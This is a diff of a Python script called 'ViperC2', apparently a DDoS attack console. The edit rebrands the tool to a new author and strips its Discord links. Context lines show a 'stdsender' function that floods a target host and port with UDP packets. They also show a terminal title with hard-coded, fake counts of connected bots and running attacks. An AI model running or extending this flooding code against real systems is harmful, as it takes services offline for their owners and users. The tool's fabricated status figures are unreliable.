@@ -224,15 +224,15 @@ methods = """
 """
 
 ticket = """
-\033[96m For Ticket You Can Join Our Discord Server. https://dsc.gg/hxd-cm
+\033[96m For Ticket You Can Join Our Discord Server. 
 """
 
 banner =  """
 \033[93m
 ───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───   Welcome! to ViperC2 
 ───█▒▒░░░░░░░░░▒▒█───   Use "help" For Help Command
-────█░░█░░░░░█░░█────   Join Our Discord https://dsc.gg/hxd-cm
-─▄▄──█░░░▀█▀░░░█──▄▄─   Made By : ItzSeven And ItzNone
+────█░░█░░░░░█░░█──── 
+─▄▄──█░░░▀█▀░░░█──▄▄─   Made By : BoNi 
 █░░█─▀▄░░░░░░░▄▀─█░░█
 █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
 █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
@@ -563,8 +563,6 @@ def stdsender(host, port, timer, payload):
         sock.sendto(payload, (host, int(port)))
         sock.sendto(payload, (host, int(port)))
     atks -= 1
-    running -= 1
-
 def main():
     global fsubs
     global tpings
@@ -584,7 +582,7 @@ def main():
 
     while True:
         powerran = (random.randint(5,16))
-        sys.stdout.write("\x1b]2;[-]ViperC2 | Online User : [{}] | Running Attack [6] | Bot Connected [89] | Admin : [ItzSeven] | Backup Server : [2] | Username : admin\x07".format (powerran))
+        sys.stdout.write("\x1b]2;[-]ViperC2 | Online User : [{}] | Running Attack [6] | Bot Connected [89] | Admin : [BoNi] | Backup Server : [2] | Username : admin\x07".format (powerran))
         sin = input("\033[95m[\033[97madmin@Viper\033[95m]\033[37m >> \033[92m".format(nicknm)).lower()
         sinput = sin.split(" ")[0]
 
